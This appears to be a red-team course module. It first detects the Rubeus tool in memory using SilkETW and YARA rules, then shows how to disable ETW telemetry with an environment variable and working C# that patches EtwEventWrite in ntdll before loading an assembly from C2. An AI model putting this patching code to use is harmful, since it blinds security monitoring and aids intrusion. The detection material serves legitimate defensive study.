Event Tracing for Windows (ETW) provides a mechanism to trace and log events that are raised by user-mode applications.  [SilkETW](https://github.com/mandiant/SilkETW) takes most of the pain out of consuming ETW events for a wide array of offensive and defensive purposes.  It's next largest strengths (in my view) are the formats it can output to (URL, Windows Event Log, JSON) and it's integration with [YARA](https://virustotal.github.io/yara/).

A popular use case for it is to provide .NET introspection - that is, to detect .NET assemblies in memory.  Let's explore ways to detect Rubeus in-memory...

  

When a .NET assembly is loaded, the Microsoft-Windows-DotNETRuntime provider produces an event called `AssemblyLoad`.  The data contained is the fully qualified name of the assembly.

```powershell
C:\Tools\SilkETW\SilkETW\bin\x86\Release>SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\Users\Administrator\Desktop\etw.json -f EventName -fv Loader/AssemblyLoad

███████╗██╗██╗   ██╗  ██╗███████╗████████╗██╗    ██╗
██╔════╝██║██║   ██║ ██╔╝██╔════╝╚══██╔══╝██║    ██║
███████╗██║██║   █████╔╝ █████╗     ██║   ██║ █╗ ██║
╚════██║██║██║   ██╔═██╗ ██╔══╝     ██║   ██║███╗██║
███████║██║█████╗██║  ██╗███████╗   ██║   ╚███╔███╔╝
╚══════╝╚═╝╚════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚══╝╚══╝
                  [v0.8 - Ruben Boonen => @FuzzySec]

[+] Collector parameter validation success..
[>] Starting trace collector (Ctrl-c to stop)..
[?] Events captured: 6
```

  

Whilst SilkETW is running, execute `C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe`.  Review the JSON file and we see the following entries: `"FullyQualifiedAssemblyName":"Rubeus, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"`

Based on this we can create a YARA rule.  Save this to `C:\Users\Administrator\Desktop\YARA\rubeus.yara`.

```json
rule Rubeus_FullyQualifiedAssemblyName
{
    strings:
        $fqan = "Rubeus, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" ascii nocase wide
    condition:
        $fqan
}
```

  

Run SilkETW again, but provide the `-y` and `-yo` options for YARA.  Execute Rubeus again and the rule should trigger.

```powershell
C:\Tools\SilkETW\SilkETW\bin\x86\Release>SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\Users\Administrator\Desktop\etw.json -f EventName -fv Loader/AssemblyLoad -y C:\Users\Administrator\Desktop\YARA -yo Matches

[+] Collector parameter validation success..
[>] Starting trace collector (Ctrl-c to stop)..
[?] Events captured: 8
     -> Yara match: Rubeus_FullyQualifiedAssemblyName
```

  

The `Loader/ModuleLoad` event will show modules that have been loaded by an assembly.  Applications that have been compiled as Debug will attempt to load its associated PDB database.  In this case we'd see `"ManagedPdbBuildPath":"C:\\Tools\\Rubeus\\Rubeus\\obj\\Debug\\Rubeus.pdb"` in the JSON output.

We can add another YARA rule to the file to search for `"Rubeus.pdb"` and run again.

```json
rule Rubeus_ProgramDatabase
{
    strings:
        $pdb = "Rubeus.pdb" ascii nocase wide
    condition:
        $pdb
}
```

```powershell
C:\Tools\SilkETW\SilkETW\bin\x86\Release>SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\Users\Administrator\Desktop\etw.json -y C:\Users\Administrator\Desktop\YARA -yo Matches

[+] Collector parameter validation success..
[>] Starting trace collector (Ctrl-c to stop)..
[?] Events captured: 596
     -> Yara match: Rubeus_FullyQualifiedAssemblyName
     -> Yara match: Rubeus_ProgramDatabase
```

  

IL (intermediary language) stubs are dynamically generated by the CLR (common language runtime).  They handle the marshalling and invocation of native methods (ala P/Invoke) and can therefore be used to find assemblies using interop to access unmanaged code.  We can filter on these with `-fv ILStub/StubGenerated`.

From that, we'll see namespaces such as `Rubeus.Interop/TOKEN_INFORMATION_CLASS` and `Rubeus.Interop/LSA_STRING`.

```
rule Rubeus_Interop
{
    strings:
        $tic = "Rubeus.Interop/TOKEN_INFORMATION_CLASS" ascii nocase wide
        $lsa = "Rubeus.Interop/LSA_STRING" ascii nocase wide
    condition:
        any of them
}
```

```powershell
C:\Tools\SilkETW\SilkETW\bin\x86\Release>SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\Users\Administrator\Desktop\etw.json -y C:\Users\Administrator\Desktop\YARA -yo Matches

[+] Collector parameter validation success..
[>] Starting trace collector (Ctrl-c to stop)..
[?] Events captured: 664
     -> Yara match: Rubeus_FullyQualifiedAssemblyName
     -> Yara match: Rubeus_ProgramDatabase
     -> Yara match: Rubeus_Interop
```
  

An interesting note is that just running `Rubeus.exe` will not trigger the `Rubeus_Interop` rule.  Because the assembly did not execute any code that uses interop, the no IL stubs were generated that would trigger it. `Rubeus.exe klist` will trigger the rule.

---

If executing an exe on disk from a shell, the easiest (and most ridiculous) way to disable ETW events is to set the `COMPlus_ETWEnabled` environment variable to `0`.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/etw/complus.png)


To disable ETW in code, we can take a cue from the popular [in-memory patching technique](https://rastamouse.me/memory-patching-amsi-bypass/) to disable AMSI.  Advapi32.dll exports an API called **EventWrite** which forwards to **EtwEventWrite** in ntdll.dll.  We can patch instructions in memory at one of these locations to prevent the API writing events.

Consider the following boilerplate code:

```csharp
// pretend this is coming down a C2 as a byte[]
var bytes = File.ReadAllBytes(@"C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe");

// load the assembly
var assembly = Assembly.Load(bytes);

// invoke its entry point with arguments
assembly.EntryPoint.Invoke(null, new object[] { args });
```

  

Prior to loading the assembly, we'd like to locate one of those APIs (let's go with the lower-level EtwEventWrite) and write a `RET` at the beginning.

> A simple RET works fine for x64, but if on x86 you will need to adjust the stack first.

  

The high level steps are as follows:

-   Get the memory address of ntdll in the current process.
-   Get the memory address of EtwEventWrite from ntdll.
-   Make that region of memory writeable
-   Copy the patch
-   Restore the memory permissions

  

```csharp
// get location of ntdll.dll
var hModule = LoadLibrary("ntdll.dll");
Console.WriteLine("ndtll: 0x{0:X}", hModule.ToInt64());

// find EtwEventWrite
var hfunction = GetProcAddress(hModule, "EtwEventWrite");
Console.WriteLine("EtwEventWrite: 0x{0:X}", hfunction.ToInt64());

var patch = new byte[] { 0xC3 };

// mark as RW
VirtualProtect(hfunction, (UIntPtr)patch.Length, 0x04, out var oldProtect);
Console.WriteLine("Memory: 0x{0:X} -> 0x04", oldProtect);

// write a ret
Marshal.Copy(patch, 0, hfunction, patch.Length);

// restore memory
VirtualProtect(hfunction, (UIntPtr)patch.Length, oldProtect, out _);
Console.WriteLine("Memory: 0x04 -> 0x{0:X}", oldProtect);
```

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/etw/etweventwrite.png)

  

**LoadLibrary** and **GetProcAddress** are native APIs that you must P/Invoke.  If you want to give it a try with D/Invoke, take a look at `Generic.GetLibraryAddress()`.

Where Cobalt Strike does have an `amsi_disable` directive in Malleable C2, it has no equivalent like "etw_disable".  The most viable way to integrate this style of ETW patching with execute-assembly, is via a user defined reflective loader (discussed in a later module).